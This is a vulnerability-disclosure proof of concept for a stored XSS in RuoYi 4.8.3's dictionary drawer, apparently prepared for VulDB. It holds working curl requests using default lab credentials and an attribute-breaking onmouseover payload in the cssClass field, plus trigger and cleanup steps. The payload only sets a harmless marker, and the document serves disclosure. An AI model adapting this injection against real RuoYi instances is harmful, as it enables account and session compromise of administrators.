# Lab PoC: RuoYi 4.8.3 dictionary preview stored XSS

Authorized lab use only. This file is the standalone exploit/PoC text for the VulDB form.

Target: RuoYi 4.8.3, commit `3b3941abeb5402297e5b4de82a30e6471c2239f3`.

Prerequisite:

- Attacker account has `system:dict:add`. Super-admin is not required.
- Lab seed user `ry` / `admin123` is sufficient.
- Victim has dictionary-list access, opens `/system/dict`, opens a dictionary-type drawer, and hovers the stored label.
- Default `xss.enabled=true` does not block this path.

## 1. Low-privilege write

```bash
BASE='http://127.0.0.1:18081'
WORK_DIR="$(mktemp -d /tmp/ruoyi-dict-xss-XXXXXX)"
COOKIE_FILE="$WORK_DIR/cookie.txt"

curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" -X POST "$BASE/login" \
  --data 'username=ry&password=admin123&rememberMe=false'

curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" "$BASE/index" >/dev/null
DICT_PAGE="$(curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" "$BASE/system/dict")"
CSRF_TOKEN="$(printf '%s\n' "$DICT_PAGE" \
  | sed -n 's/.*content="\([^"]*\)" name="csrf-token".*/\1/p' | head -1)"

curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -X POST "$BASE/system/dict/data/add" \
  --data-urlencode 'dictLabel=E2E_XSS_PROBE' \
  --data-urlencode 'dictValue=cve_e2e_xss_20260906' \
  --data-urlencode 'dictType=sys_normal_disable' \
  --data-urlencode 'dictSort=9995' \
  --data-urlencode 'cssClass=x" onmouseover="document.body.dataset.cveProbe=1' \
  --data-urlencode 'listClass=' \
  --data-urlencode 'status=0' \
  --data-urlencode 'isDefault=N'
```

Expected write response:

```json
{"msg":"操作成功","code":0}
```

Stored row:

```text
create_by = ry
css_class = x" onmouseover="document.body.dataset.cveProbe=1
list_class = NULL
```

If the target uses default `csrf.enabled=false`, omit `X-CSRF-Token`.

## 2. Administrator trigger

On the administrator `/system/dict` page, open dictionary type `sys_normal_disable`, then run:

```javascript
const injected = document.querySelector('#drawerBody span[onmouseover]');
console.log(injected.outerHTML);
injected.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
console.log(document.body.dataset.cveProbe);
```

Expected:

```text
<span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
1
```

A normal hover on the `E2E_XSS_PROBE` label produces the same result.

## 3. Observed lab result

```text
LOW_ADD={"msg":"操作成功","code":0}
LOW_ID=104
before.evil=<span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
trigger.probe=1
after=1
LOW_REMOVE={"msg":"操作成功","code":0}
DB_REMAINING=0
```

## 4. Benign control

Same endpoint, only the trigger field changes:

```text
cssClass=label-safe
listClass=
```

Expected: `<span class="label-safe">...</span>`, no `onmouseover`, `document.body.dataset.cveProbe` unchanged.

## 5. Cleanup

```bash
curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -X POST "$BASE/system/dict/data/remove" \
  --data-urlencode 'ids=104'
```

Or:

```sql
DELETE FROM sys_dict_data WHERE dict_value = 'cve_e2e_xss_20260906';
```
